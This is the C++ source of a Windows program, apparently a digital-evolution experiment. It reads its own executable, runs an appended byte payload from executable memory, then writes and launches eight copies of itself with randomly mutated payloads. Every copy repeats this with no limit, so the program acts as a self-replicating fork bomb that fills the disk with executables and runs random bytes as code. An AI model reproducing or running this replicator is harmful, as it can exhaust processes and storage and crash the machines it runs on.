// Unicorn2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include<Windows.h>
#include<sys\timeb.h> 
int NextPayloadSize = 1024;
#define NextNum 8
#define GapTime 128

int myEXESize = 0;
int myStaticLength = 0;
int myPayloadLength = 0;
UINT8* myFileBuffer = 0;
UINT8* executeableMem = 0;
//UINT8 nextPayloadBuf[NextPayloadSize] = { 0 };
UINT8* nextPayloadBuf = 0;
char nextEXEName[256] = { 0 };

STARTUPINFOA si;
PROCESS_INFORMATION pi;

struct timeb AccuTime;

int MuPos = 0;

//typedef void(*myFunc)(void);
//void(*f1)(void) = (void(*)(void)) executeableMem;
//static UINT8 myTestcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 };

void GenNxtPayload();
void MuNxtPayload();

int main(int argc, char** argv)
{
    //printf("0x%x", myTestcode[0]);
    ftime(&AccuTime);
    srand((unsigned)AccuTime.time);
    FILE* fp = fopen(argv[0], "rb");
    fseek(fp, 0, SEEK_END);
    myEXESize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    myFileBuffer = (UINT8 *)malloc(myEXESize);
    fread(myFileBuffer, 1, myEXESize, fp);
    fclose(fp);
    for (int i = 0; i < myEXESize - 3; i++)
        if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
        {
            //printf("Found Payload Start @ 0x%X\n", i);
            myStaticLength = i;
            myPayloadLength = myEXESize - myStaticLength;
            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength - 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            memcpy(executeableMem, myFileBuffer + myStaticLength + 1, myPayloadLength);
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)executeableMem, 0, 0, 0);
            break;
        }
    if (myStaticLength == 0)
    {
        myStaticLength = myEXESize;
        nextPayloadBuf = (UINT8*)malloc(NextPayloadSize);
        nextPayloadBuf[0] = 0x23;
        for (int i = 1; i < NextPayloadSize - 1; i++)
        {
            nextPayloadBuf[i] = 0x90;
        }
        nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
    }
    else
    {
        nextPayloadBuf = myFileBuffer + myStaticLength;
        NextPayloadSize = myPayloadLength;
    }

    for (int i = 0; i < NextNum; i++)
    {
        MuNxtPayload();
        sprintf(nextEXEName, "Unicor2-0x%X%X.exe", rand(), rand());
        fp = fopen(nextEXEName, "wb");
        fwrite(myFileBuffer, 1, myStaticLength, fp);
        fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
        fclose(fp);
        //CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_NORMAL);
        Sleep(GapTime);
        nextPayloadBuf[MuPos] = 0x90;
    }
    
}

void MuNxtPayload()
{
    MuPos = rand() % (NextPayloadSize - 5) + 4;
    nextPayloadBuf[MuPos] = rand() % 256;
}

void GenNxtPayload()
{
    //ftime(&AccuTime);
    //srand((unsigned)AccuTime.time);
    nextPayloadBuf[0] = 0x90;
    nextPayloadBuf[1] = 0x90;
    nextPayloadBuf[2] = 0x90;
    for (int i = 3; i < NextPayloadSize - 1; i++)
    {
        nextPayloadBuf[i] = rand() % 256;
    }
    nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
}
